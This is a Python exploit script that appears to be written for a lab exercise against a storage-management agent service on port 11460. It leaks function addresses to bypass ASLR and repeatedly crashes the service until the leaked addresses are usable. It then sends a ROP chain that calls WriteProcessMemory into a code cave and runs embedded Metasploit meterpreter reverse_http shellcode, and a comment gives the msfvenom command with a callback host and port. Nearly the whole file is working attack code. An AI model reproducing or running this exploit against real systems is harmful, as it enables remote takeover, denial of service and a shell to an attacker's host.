#!/usr/bin/env python3

import socket
import sys
import time
import traceback
from struct import pack


def parseResponse(response):
    """ Parse a server response and extract the leaked address """
    pattern = b"Address is:"
    address = None
    for line in response.split(b"\n"):
        if line.find(pattern) != -1:
            address = int((line.split(pattern)[-1].strip()), 16)
    if not address:
        return 0
    return address


def leak_function_address(function_name: bytearray, server: str, port: int) -> int:
    """ Leaks a function address from the server. """
    psAgentCommand = bytearray([0x41] * 0xC)
    psAgentCommand += pack("<i", 0x2000)  # opcode
    psAgentCommand += pack("<i", 0x0)  # 1st memcpy: offset
    psAgentCommand += pack("<i", 0x100)  # 1st memcpy: size field
    psAgentCommand += pack("<i", 0x100)  # 2nd memcpy: offset
    psAgentCommand += pack("<i", 0x100)  # 2nd memcpy: size field
    psAgentCommand += pack("<i", 0x200)  # 3rd memcpy: offset
    psAgentCommand += pack("<i", 0x100)  # 3rd memcpy: size field
    psAgentCommand += bytearray([0x41] * 0x8)

    symbol = b"SymbolOperation" + function_name + b"\x00"
    psCommandBuffer = symbol + b"A" * (100 - len(symbol))
    psCommandBuffer += b"B" * 0x100
    psCommandBuffer += b"C" * 0x100

    # checksum and command.
    buf = pack(">i", len(psAgentCommand) + len(psCommandBuffer) - 4) + psAgentCommand + psCommandBuffer

    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((server, port))
        s.send(buf)
        response = s.recv(1024)
        s.close()
    except:
        return 0

    return parseResponse(response)


def crash_server(server: str, port: int):
    payload_size = 0x64  # Total size of payload not including checksum.
    agent_command_size = 0x30  # Size of the agent command portion.
    command_buffer_size = payload_size - agent_command_size  # Size of the command buffer.

    agent_command_buffer = b"A" * 0x10
    agent_command_buffer += b"\x44\x61\x36\xf8"  # offset first copy. Large negative value.
    agent_command_buffer += b"\xA7\x61\x00\x00"  # size of first copy
    agent_command_buffer += b"\xA7\x61\x00\x00"  # offset for second copy
    agent_command_buffer += b"\xA7\x61\x00\x00"  # size of second copy
    agent_command_buffer += b"\xA7\x61\x00\x00"  # offset of third copy
    agent_command_buffer += b"\xA7\x61\x00\x00"  # size of third copy
    agent_command_buffer += b"A" * (agent_command_size - len(agent_command_buffer))

    buf = pack(">i", payload_size)
    buf += agent_command_buffer
    buf += bytearray([0x42] * command_buffer_size)

    continue_send_data = True
    while continue_send_data:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((server, port))
            s.send(buf)
            s.close()
            continue_send_data = False
        except:
            pass


def bad_char_check(buffer: bytearray):
    bad_chars = b"\x00\x09\x0a\x0c\x0d\x20"
    for bad_char in bad_chars:
        offset = 0
        for test_byte in buffer:
            if test_byte == bad_char:
                print("Bad character detected in shell code.")
                print("Buffer offset: {}".format(offset))
                print("Character: {}".format(hex(bad_char)))
                traceback.print_stack()
                return True
            offset += 1
    return False


def upload_shell(libeay32IBM019Func: int, WPMAddr: int, server: str, port: int):
    dllBase = libeay32IBM019Func - 0x14E0
    eip_offset = 276
    command_buffer_length = 0x600

    # psAgentCommand
    buf = bytearray([0x41] * 0xC)
    buf += pack("<i", 0x534)  # opcode
    buf += pack("<i", 0x0)  # 1st memcpy: offset
    buf += pack("<i", 0x700)  # 1st memcpy: size field
    buf += pack("<i", 0x0)  # 2nd memcpy: offset
    buf += pack("<i", 0x100)  # 2nd memcpy: size field
    buf += pack("<i", 0x0)  # 3rd memcpy: offset
    buf += pack("<i", 0x100)  # 3rd memcpy: size field
    buf += bytearray([0x40] * 0x8)

    # psCommandBuffer
    wpm = b""
    wpm += pack("<L", (WPMAddr))  # WriteProcessMemory Address
    wpm += pack("<L", (dllBase + 0x92c04))  # Shellcode Return Address. <- Our code cave.
    wpm += pack("<L", (0xFFFFFFFF))  # pseudo Process handle. <- -1
    wpm += pack("<L", (dllBase + 0x92c04))  # Code cave address.
    wpm += pack("<L", (0x41414141))  # dummy lpBuffer (Stack address) <- To be edited with ROP gadgets.
    wpm += pack("<L", (0x42424242))  # dummy nSize <- To be edited with ROP gadgets.
    wpm += pack("<L", (dllBase + 0xe401c))  # lpNumberOfBytesWritten <- Writable data section of dll.
    wpm += b"\x60" * 0x10

    # Note: offset goes before wpm.
    offset = b"\x43" * (eip_offset - len(wpm))

    if bad_char_check(wpm): return True

    # Place esp into eax.
    # bp libeay32IBM019 + 0x408d6
    eip = pack("<L", (dllBase + 0x408d6))  # push esp ; pop esi ; ret <- mov esi, esp

    if bad_char_check(eip): return True

    # Patching lpBuffer
    rop = pack("<L", (dllBase + 0x296f))  # mov eax, esi ; pop esi ; ret <- eax = esi = stack pointer.
    rop += pack("<L", (0x30303030))  # junk into esi

    # Align eax to shellcode.
    # Add 100 to eax by adding large numbers.
    # 0:077> ? 0x88888888 + 0x77777878
    # Evaluate expression: 4294967552 = 00000001`00000100 = 100
    # 0:077> ? 00000001`00000100 - 88888888
    # Evaluate expression: 2004318328 = 77777878
    rop += pack("<L", (dllBase + 0x117c))  # pop ecx ; ret <- Place 0x88888888 in ecx.
    rop += pack("<L", (0x88888888))
    rop += pack("<L", (dllBase + 0x1d0f0))  # add eax, ecx ; ret <- add 0x88888888 to eax which contains esp.
    rop += pack("<L", (dllBase + 0x117c))  # pop ecx ; ret <- Place 0x77777878 into ecx.
    rop += pack("<L", (0x77777878))
    rop += pack("<L", (dllBase + 0x1d0f0))  # add eax, ecx ; ret <- add to eax.

    # Move esp + 100 to ecx.
    rop += pack("<L", (dllBase + 0x8876d))  # mov ecx, eax ; mov eax, esi ; pop esi ; retn 0x0010
    rop += pack("<L", (0x30303030))  # junk into esi
    rop += pack("<L", (dllBase + 0x48d8c))  # pop eax ; ret
    rop += pack("<L", (0x30303030))  # junk for ret 0x10
    rop += pack("<L", (0x30303030))  # junk for ret 0x10
    rop += pack("<L", (0x30303030))  # junk for ret 0x10
    rop += pack("<L", (0x30303030))  # junk for ret 0x10
    rop += pack("<L", (0xfffffee0))  # pop into eax
    rop += pack("<L", (dllBase + 0x1d0f0))  # add eax, ecx ; ret
    rop += pack("<L", (dllBase + 0x1fd8))  # mov [eax], ecx ; ret

    # Patching nSize
    rop += pack("<L", (dllBase + 0xbc79))  # inc eax ; ret
    rop += pack("<L", (dllBase + 0xbc79))  # inc eax ; ret
    rop += pack("<L", (dllBase + 0xbc79))  # inc eax ; ret
    rop += pack("<L", (dllBase + 0xbc79))  # inc eax ; ret
    rop += pack("<L", (dllBase + 0x408dd))  # push eax ; pop esi ; ret
    rop += pack("<L", (dllBase + 0x48d8c))  # pop eax ; ret
    rop += pack("<L", (0xfffffdf4))  # -524
    rop += pack("<L", (dllBase + 0x1d8c2))  # neg eax ; ret
    rop += pack("<L", (dllBase + 0x8876d))  # mov ecx, eax ; mov eax, esi ; pop esi ; retn 0x0010
    rop += pack("<L", (0x30303030))  # junk into esi
    rop += pack("<L", (dllBase + 0x1fd8))  # mov [eax], ecx ; ret
    rop += pack("<L", (0x30303030))  # junk for ret 0x10
    rop += pack("<L", (0x30303030))  # junk for ret 0x10
    rop += pack("<L", (0x30303030))  # junk for ret 0x10
    rop += pack("<L", (0x30303030))  # junk for ret 0x10

    # Align ESP with ROP Skeleton
    rop += pack("<L", (dllBase + 0x117c))  # pop ecx ; ret
    rop += pack("<L", (0xffffffec))  # -0x14
    rop += pack("<L", (dllBase + 0x1d0f0))  # add eax, ecx ; ret
    # bp libeay32IBM019 + 0x5b415
    rop += pack("<L", (dllBase + 0x5b415))  # xchg eax, esp ; ret
    # Okay, executing WriteProcessMemory and will return to shell code in memory.

    if bad_char_check(rop): return True

    offset2 = b"\xcc" * 0x6C

    # shellcode = bytes(subprocess.check_output(["/usr/bin/msf-pattern_create", "-l", str(0x200)]).strip())
    # shellcode = b"\x90" * 0x100
    # Note: This shellcode will crash because the encoder tries to modify memory in a read / exec memory region.
    # msfvenom -p windows/meterpreter/reverse_http LHOST=192.168.49.185 LPORT=8080 -b "\x00\x09\x0a\x0b\x0c\x0d\x20" -f python -v shellcode
    shellcode = b""
    shellcode += b"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
    shellcode += b"\xdb\xde\xd9\x74\x24\xf4\xbb\xbf\x06\x2d\xb1"
    shellcode += b"\x5a\x2b\xc9\xb1\x84\x83\xea\xfc\x31\x5a\x16"
    shellcode += b"\x03\x5a\x16\xe2\x4a\xfa\xc5\x3e\xb4\x03\x16"
    shellcode += b"\x21\x3d\xe6\x27\x73\x59\x62\x15\x43\x2a\x26"
    shellcode += b"\x96\x28\x7e\xd3\x2d\x5c\x56\xea\xce\xae\x11"
    shellcode += b"\x46\x17\x80\x9d\xfb\x6b\x83\x61\x06\xb8\x63"
    shellcode += b"\x58\xc9\xcd\x62\x9d\x9f\xb8\x8b\x73\xab\x11"
    shellcode += b"\x44\xf8\xe9\xa9\x33\xff\x3d\x5a\xfb\x87\x38"
    shellcode += b"\x9d\x88\x3b\x42\xce\xfa\x9b\x64\xbe\x77\x53"
    shellcode += b"\x7d\x3f\x5b\xe6\xb4\x4b\x67\xd9\xb9\xfd\x1c"
    shellcode += b"\x2d\xcd\xff\xf4\x7c\x11\x53\x39\xb1\x9c\xad"
    shellcode += b"\x7d\x75\x7f\xd8\x75\x86\x02\xdb\x4d\xf5\xd8"
    shellcode += b"\x6e\x52\x5d\xaa\xc9\xb6\x5c\x7f\x8f\x3d\x52"
    shellcode += b"\x34\xdb\x1a\x76\xcb\x08\x11\x82\x40\xaf\xf6"
    shellcode += b"\x03\x12\x94\xd2\x48\xc0\xb5\x43\x34\xa7\xca"
    shellcode += b"\x94\x90\x18\x6f\xde\x32\x4e\x0f\x1f\xcd\x6f"
    shellcode += b"\x4d\x88\x5f\xf5\x1a\x48\xf7\x82\x8b\x26\x6e"
    shellcode += b"\x39\x24\xfb\x07\xe7\xb3\xfc\x32\xd6\x60\x51"
    shellcode += b"\xef\x4a\xc4\x05\xe7\x1e\xea\xa9\xf7\xad\x85"
    shellcode += b"\xd3\x9e\x41\x36\x45\x4f\xaf\xe8\xb5\xaf\xe7"
    shellcode += b"\xa3\xdc\xc1\x93\x24\x68\x6e\x7c\xf5\xc2\xb0"
    shellcode += b"\x4d\x39\xc5\x80\x96\x19\x4e\x89\x86\x6f\x44"
    shellcode += b"\x72\x77\xe8\x92\xb0\x5e\x28\x9a\xc8\xd0\x44"
    shellcode += b"\x79\x7f\x74\xf7\xca\x16\x02\xd8\xf9\xdb\xdd"
    shellcode += b"\x08\x31\x2d\x02\x7d\x7e\x19\x16\x30\xcc\xb5"
    shellcode += b"\xb6\xa6\xa5\xae\xd3\x16\x71\x55\x7f\x3c\x12"
    shellcode += b"\xbc\x5f\x81\x84\xcc\xf0\x68\x30\x1f\x36\x46"
    shellcode += b"\x94\x6f\x66\x9c\xde\xbc\x4e\xf2\x28\xfb\x8e"
    shellcode += b"\x59\x34\x9d\xaf\x2f\xdf\x4e\x05\xe3\x28\xbe"
    shellcode += b"\x56\x35\x57\xd6\xa2\x6f\x2e\x81\x2c\x5a\x83"
    shellcode += b"\x9e\xb8\x66\x77\x73\x55\xf9\x68\x73\xa5\x11"
    shellcode += b"\x24\x73\xa5\xe1\x66\x19\x9c\x8f\x12\xa5\x90"
    shellcode += b"\x24\xd6\x07\x7a\xcd\x77\xec\xf1\x5a\xfa\x9b"
    shellcode += b"\x9d\xae\x96\x18\x1f\xf8\x57\xab\xd5\x53\xee"
    shellcode += b"\x92\x9b\x3e\x5f\x7c\x10\x8a\x37\x10\xc6\x54"
    shellcode += b"\xbd\xae\x7b\x03\x5c\x61\xe3\xf9\xd2\x50\xad"
    shellcode += b"\xb0\x82\xc8\x31\x1b\x3b\x5b\xbb\x04\x7d\x9c"
    shellcode += b"\x6e\xb3\x44\x31\xf9\xc4\x4a\xdd\x7d\x97\x19"
    shellcode += b"\x4e\x29\x4b\xc8\x18\x3e\x3e\xda\xe3\x3f\x14"
    shellcode += b"\xb4\x79\xca\xc8\xea\x2e\x99\xa5\x5a\xb8\x30"
    shellcode += b"\x4c\x7b\x43\xb4\x85\xfe\x73\x3f\x32\x69\xfb"
    shellcode += b"\xd3\x3a\x69\x93\x97\xca\x5c\x83\xe7\xfe\xd0"
    shellcode += b"\x36\xf9\xe9\xa4\xb8\xf9\xe9\x50\xf8\x91\xe9"
    shellcode += b"\xb4\xf8\x61\x82\xb4\xf8\x21\x52\xe6\x90\xf9"
    shellcode += b"\xf6\x5b\x85\x05\x23\xc8\x16\xa9\x45\x08\xcf"
    shellcode += b"\x25\x56\xf7\xef\xb5\x05\xa1\x87\xa7\x3f\xc4"
    shellcode += b"\xb5\x37\xea\x52\xf9\xbc\xda\xd6\xfe\x3d\x26"
    shellcode += b"\x6d\xc0\x4b\x4d\x36\x03\xec\x65\xb8\x7c\xec"
    shellcode += b"\x89\x76\xbb\x21\x58\x48\x8d\x7d\x8a\x9e\xc8"
    shellcode += b"\x53\xe3\xe6\x1f\xac\xb8\xe7\xea\x0e\xe8\x6d"
    shellcode += b"\x14\x1c\xea\xa7"

    padding = b"\xcc" * (command_buffer_length - eip_offset - 4 - len(rop) - len(offset2) - len(shellcode))

    if bad_char_check(shellcode): return True

    payload = offset + wpm + eip + rop + offset2 + shellcode + padding

    if bad_char_check(payload): return True

    formatString = b"File: %s From: %d To: %d ChunkLoc: %d FileLoc: %d" % (payload, 0, 0, 0, 0)
    buf += formatString

    # Checksum
    buf = pack(">i", len(buf) - 4) + buf

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((server, port))
    s.send(buf)
    s.close()

    return False


def main():
    bad_chars = b"\x00\x09\x0a\x0c\x0d\x20"
    server = "192.168.185.10"
    port = 11460
    bad_chars_remain = True
    write_process_memory_addr = 0
    get_new_lockid_addr = 0
    libeay32IBM019Base = 0

    while bad_chars_remain:
        while write_process_memory_addr == 0 or get_new_lockid_addr == 0 or libeay32IBM019Base == 0:
            write_process_memory_addr = leak_function_address(b"WriteProcessMemory", server, port)
            get_new_lockid_addr = leak_function_address(b"N98E_CRYPTO_get_new_lockid", server, port)
            libeay32IBM019Base = get_new_lockid_addr - 0x14E0


        print("WriteProcessMemory Address: " + hex(write_process_memory_addr))
        print("N98E_CRYPTO_get_new_lockid Address: " + hex(get_new_lockid_addr))
        print("Libeay32IBM019 Base Address: " + hex(libeay32IBM019Base))

        base_address_bytes = pack(">i", libeay32IBM019Base)
        bad_chars_remain = False

        for bad_char in bad_chars:
            if base_address_bytes[0] == bad_char or base_address_bytes[1] == bad_char:
                print("Bad character detected. Restarting server...")
                print("Note: It might take a while for the server to restart.")
                bad_chars_remain = True
                crash_server(server, port)
                write_process_memory_addr = 0
                get_new_lockid_addr = 0
                libeay32IBM019Base = 0
                break;

        bad_chars_remain = upload_shell(get_new_lockid_addr, write_process_memory_addr, server, port)
        if bad_chars_remain:
            print("Bad characters in payload. Restarting server..")
            print("Note: It might take a while for the server to restart.")
            crash_server(server, port)
            write_process_memory_addr = 0
            get_new_lockid_addr = 0
            libeay32IBM019Base = 0

    print("Exploit sent!")
    sys.exit(0)


if __name__ == "__main__":
    main()
